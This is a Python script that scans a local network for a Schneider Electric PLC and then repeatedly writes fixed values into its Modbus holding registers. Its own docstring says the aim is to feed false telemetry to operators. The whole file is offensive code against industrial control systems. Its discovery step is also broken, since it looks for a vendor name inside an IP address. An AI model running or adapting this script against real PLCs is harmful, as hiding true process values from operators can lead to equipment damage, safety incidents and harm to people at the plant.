from scapy.all import ARP, Ether, srp
from pyModbusTCP.client import ModbusClient
import time

# Define network parameters
NETWORK_RANGE = "192.168.1.0/24"  # Adjust based on your environment

def find_plc_ip():
    """Scan the network to discover the PLC's IP address."""
    print("[*] Scanning network for PLC IP...")
    arp_req = ARP(pdst=NETWORK_RANGE)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_req
    
    answered_list, _ = srp(arp_request_broadcast, timeout=2, verbose=False)
    
    for sent, received in answered_list:
        if "Schneider Electric" in received.psrc:
            print(f"[+] PLC Found: {received.psrc}")
            return received.psrc
    
    print("[-] PLC not found. Exiting.")
    return None

def spoof_reporting_messages(plc_ip):
    """Spoof reporting messages to send false telemetry data to operators."""
    client = ModbusClient(host=plc_ip, port=502, unit_id=1, auto_open=True)

    if not client.open():
        print(f"[-] Could not connect to PLC at {plc_ip}")
        return
    
    print(f"[+] Successfully connected to PLC at {plc_ip}")
    
    while True:
        # Reading original values (e.g., register 0 holds a sensor value)
        try:
            orig_values = client.read_holding_registers(0, 2)  # Adjust range as needed
            if orig_values:
                print(f"[*] Original Sensor Values: {orig_values}")
                
                # Crafting spoofed messages (e.g., reporting normal operation)
                spoofed_values = [100, 200]  # Example false telemetry
            
                # Writing spoofed values back (assuming control station reads these)
                client.write_multiple_registers(0, spoofed_values)
                print(f"[+] Spoofed Sensor Values Sent: {spoofed_values}")
            else:
                print("[-] No response from PLC.")
                
        except Exception as e:
            print(f"[-] Error communicating with PLC: {e}")
        
        time.sleep(5)  # Periodically spoof messages

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        spoof_reporting_messages(plc_ip)